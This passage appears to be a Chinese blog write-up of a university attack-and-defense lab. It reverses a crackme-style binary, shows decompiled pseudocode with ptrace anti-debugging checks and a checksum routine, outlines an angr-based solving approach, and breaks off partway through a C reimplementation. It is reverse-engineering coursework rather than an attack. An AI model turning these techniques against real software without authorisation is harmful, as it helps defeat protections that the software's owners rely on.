64位,通过给程序一个正确的输入,当验证输入正确的时候,会从flag文件中读取flag.flag文件在远程服务器上,所以在本地调试好后要和服务器进行交互拿到flag.</p>\n<p>​\t\t先对程序进行了逆向分析,对算法进行逆向编写,编写过程比较困难,最后失败.采取爆破的方法,利用angr工具求解.</p>\n<p><img src=\"/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/image-20230310200230541.png\" alt=\"image-20230310200230541\"></p>\n<h2 id=\"程序分析\"><a href=\"#程序分析\" class=\"headerlink\" title=\"程序分析\"></a>程序分析</h2><h3 id=\"程序伪代码\"><a href=\"#程序伪代码\" class=\"headerlink\" title=\"程序伪代码\"></a>程序伪代码</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __fastcall __noreturn <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">__pid_t</span> v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">__pid_t</span> v4; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v5; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v6; <span class=\"comment\">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v7; <span class=\"comment\">// [rsp+4h] [rbp-3Ch]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> size; <span class=\"comment\">// [rsp+8h] [rbp-38h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> size_4; <span class=\"comment\">// [rsp+Ch] [rbp-34h]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *ptr; <span class=\"comment\">// [rsp+10h] [rbp-30h]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *s; <span class=\"comment\">// [rsp+18h] [rbp-28h]</span></span><br><span class=\"line\">  FILE *stream; <span class=\"comment\">// [rsp+20h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v13; <span class=\"comment\">// [rsp+28h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v13 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( ptrace(PTRACE_TRACEME, <span class=\"number\">0LL</span>, <span class=\"number\">1LL</span>, <span class=\"number\">0LL</span>) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Do not trace me!&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v3 = getpid();</span><br><span class=\"line\">  v4 = getsid(v3);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v4 != getppid() )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Do not trace me!&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ptr = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  s = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v7 = sub_BFA();</span><br><span class=\"line\">  stream = fopen(<span class=\"string\">&quot;code&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !stream )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;Could not open file code!\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x1A</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  fseek(stream, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">  size = ftell(stream);</span><br><span class=\"line\">  fseek(stream, <span class=\"number\">0LL</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  ptr = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( fread(ptr, size, <span class=\"number\">1uLL</span>, stream) != <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;Error reading file code\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x18</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  size_4 = sub_C31(v7, size, (__int64)ptr);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your number is %u\\n&quot;</span>, size_4);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your answer: &quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v6);</span><br><span class=\"line\">  v5 = sub_C31(v6, size, (__int64)ptr);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size_4 == v5 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Congrats!&quot;</span>);</span><br><span class=\"line\">    s = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x40</span>uLL);</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x40</span>uLL);</span><br><span class=\"line\">    stream = fopen(<span class=\"string\">&quot;flag.txt&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    fgets((<span class=\"type\">char</span> *)s, <span class=\"number\">64</span>, stream);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>((<span class=\"type\">const</span> <span class=\"type\">char</span> *)s);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(s);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thanks for coming!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">sub_C31</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> a1, <span class=\"type\">int</span> size, __int64 ptr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int8 v7; <span class=\"comment\">// [rsp+13h] [rbp-1Dh]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int8 v8; <span class=\"comment\">// [rsp+13h] [rbp-1Dh]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int8 v9; <span class=\"comment\">// [rsp+13h] [rbp-1Dh]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int8 v10; <span class=\"comment\">// [rsp+13h] [rbp-1Dh]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int8 v11; <span class=\"comment\">// [rsp+13h] [rbp-1Dh]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v12; <span class=\"comment\">// [rsp+13h] [rbp-1Dh]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v13; <span class=\"comment\">// [rsp+14h] [rbp-1Ch]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v14; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v15; <span class=\"comment\">// [rsp+1Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v16; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v17; <span class=\"comment\">// [rsp+24h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v17 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v16 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v15 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v14 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v13 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; size; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v7 = *(_BYTE *)(i + ptr);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (v7 &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      a1 ^= dword_202020[v13];</span><br><span class=\"line\">      v13 = ((_BYTE)v13 + <span class=\"number\">1</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v8 = v7 &gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">    v3 = v8 &amp; <span class=\"number\">3</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">2</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v15 = dword_202020[v13] &amp; <span class=\"number\">0xAABBCCDD</span>;</span><br><span class=\"line\">      v13 = ((_BYTE)v13 + <span class=\"number\">1</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">      v9 = v8 &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">3</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      a1 += v14 + v15;</span><br><span class=\"line\">      v15 = <span class=\"number\">0</span>;</span><br><span class=\"line\">      v14 = <span class=\"number\">0</span>;</span><br><span class=\"line\">      v9 = v8 &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v14 = dword_202020[v13] | <span class=\"number\">0xABCDABCD</span>;</span><br><span class=\"line\">        v13 = ((_BYTE)v13 + <span class=\"number\">1</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      v9 = v8 &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (v9 &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">      a1 = ~a1;</span><br><span class=\"line\">    v10 = v9 &gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (v10 &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">      a1 ^= (((a1 &lt;&lt; <span class=\"number\">16</span>) ^ a1) &gt;&gt; <span class=\"number\">16</span>) ^ (a1 &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">    v11 = v10 &gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">    v4 = v11 &amp; <span class=\"number\">3</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">2</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v17 = dword_202020[v13] - <span class=\"number\">539034144</span>;</span><br><span class=\"line\">      v13 = ((_BYTE)v13 + <span class=\"number\">1</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">      v12 = v11 &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">3</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      a1 += v16 + v17;</span><br><span class=\"line\">      v17 = <span class=\"number\">0</span>;</span><br><span class=\"line\">      v16 = <span class=\"number\">0</span>;</span><br><span class=\"line\">      v12 = v11 &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v16 = <span class=\"number\">539034132</span> * dword_202020[v13];</span><br><span class=\"line\">        v13 = ((_BYTE)v13 + <span class=\"number\">1</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      v12 = v11 &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (v12 &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">      a1 = a1 - (a1 &amp; <span class=\"number\">7</span>) - (a1 &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> a1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"程序执行流程分析\"><a href=\"#程序执行流程分析\" class=\"headerlink\" title=\"程序执行流程分析\"></a>程序执行流程分析</h3><p><img src=\"/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/image-20230310210811794.png\" alt=\"image-20230310210811794\"></p>\n<p>​\t\t关键流程在于,随机数v7和code经过计算后输出结果.需要根据结果反推随机值.</p>\n<h3 id=\"程序关键算法分析\"><a href=\"#程序关键算法分析\" class=\"headerlink\" title=\"程序关键算法分析\"></a>程序关键算法分析</h3><p>​\t\tsub_C31函数对code和随机值v7进行计算,运算过程较为复杂,包含了许多位移运算,与或运算.流程较长.采用直接逆向的方法较为困难.所以采用了angr爆破的方法.</p>\n<h2 id=\"工具使用\"><a href=\"#工具使用\" class=\"headerlink\" title=\"工具使用\"></a>工具使用</h2><h3 id=\"ida\"><a href=\"#ida\" class=\"headerlink\" title=\"ida\"></a>ida</h3><p>​\t\tida用于静态分析,得到反汇编代码.</p>\n<h3 id=\"gdb\"><a href=\"#gdb\" class=\"headerlink\" title=\"gdb\"></a>gdb</h3><p>​\t\tgdb用于动态分析,在编写利用代码以及分析程序时,可以观察运行到某一行代码时的内存、寄存器等值和状态.</p>\n<h3 id=\"angr\"><a href=\"#angr\" class=\"headerlink\" title=\"angr\"></a>angr</h3><p>​\t\tangr是一个基于python的二进制分析框架,能够实施动态符号执行,和不同的静态分析.对本题目来说,angr可以对key的各种约束条件进行求解,从而爆破得到key的值.</p>\n<h2 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h2><h3 id=\"减少循环、获取key的完整计算过程\"><a href=\"#减少循环、获取key的完整计算过程\" class=\"headerlink\" title=\"减少循环、获取key的完整计算过程\"></a>减少循环、获取key的完整计算过程</h3><p>​\t\tangr对于循环的处理较为复杂和缓慢,所以可以通过在混淆代码中加入输出key的运算过程的代码,得到完整的运算流程.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">hunxiao</span><span class=\"params\">(<span class=\"type\">int</span> randnum, <span class=\"type\">int</span> size,<span class=\"type\">int</span> *ptr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// eax</span></span><br><span class=\"line\"> <span class=\"type\">int</span> v7; <span class=\"comment\">// [rsp+13h] [rbp-1Dh]</span></span><br><span class=\"line\"> <span class=\"type\">int</span> v8; <span class=\"comment\">// [rsp+13h] [rbp-1Dh]</span></span><br><span class=\"line\"> <span class=\"type\">int</span> v9; <span class=\"comment\">// [rsp+13h] [rbp-1Dh]</span></span><br><span class=\"line\"> <span class=\"type\">int</span> v10; <span class=\"comment\">// [rsp+13h] [rbp-1Dh]</span></span><br><span class=\"line\"> <span class=\"type\">int</span> v11; <span class=\"comment\">// [rsp+13h] [rbp-1Dh]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v12; <span class=\"comment\">// [rsp+13h] [rbp-1Dh]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v13; <span class=\"comment\">// [rsp+14h] [rbp-1Ch]</span></span><br><span class=\"line\">   <span class=\"type\">int</span> v14; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\">   <span class=\"type\">int</span> v15; <span class=\"comment\">// [rsp+1Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v16; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v17; <span class=\"comment\">// [rsp+24h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v17 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v16 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v15 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v14 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v13 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"type\">int</span> dword_202020[<span class=\"number\">16</span>] = &#123;<span class=\"number\">0x24DD20CF</span>, <span class=\"number\">0x3E4F0354</span>, <span class=\"number\">0x18B2E85F</span>, <span class=\"number\">0x2F2CAFB8</span>, <span class=\"number\">0x5810ADCB</span>,<span class=\"number\">0x42F7FF85</span>, <span class=\"number\">0x36E0D6C2</span>, <span class=\"number\">0x5F3EF93F</span>, <span class=\"number\">0x7F46E74A</span>, <span class=\"number\">0x44DDC864</span>,<span class=\"number\">0x64959795</span>, <span class=\"number\">0x39413451</span>, <span class=\"number\">0x5DC36C45</span>, <span class=\"number\">0x62037E7E</span>, <span class=\"number\">0x5AEA541F</span>,<span class=\"number\">0x153F8FAC</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;hunxiao里面的输出%p\\n&quot;</span>,*ptr); <span class=\"comment\">//这里输出的有问题</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;hunxiao里面的输出%p\\n&quot;</span>,*ptr); <span class=\"comment\">//这里输出的有问题</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">2</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"comment\">//v7 = ptr[i];</span></span><br><span class=\"line\">    v7 = *((<span class=\"type\">unsigned</span> <span class=\"type\">char</span>*)(i + (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span>)ptr));</span><br><span class=\"line\">    <span class=\"comment\">//printf(&quot;%02x\\n&quot;, *(ptr + i));</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;v7的值:%x\\n&quot;</span>,v7);</span><br><span class=\"line\">    <span class=\"comment\">//printf(&quot;v7 &amp; 1的值%x\\n&quot;,v7&amp;1);</span></span><br><span class=\"line\">    <span class=\"comment\">// 看code的每个字节的第一位是否是0,如果是0进行下面操作,</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (v7 &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> )</span><br><span 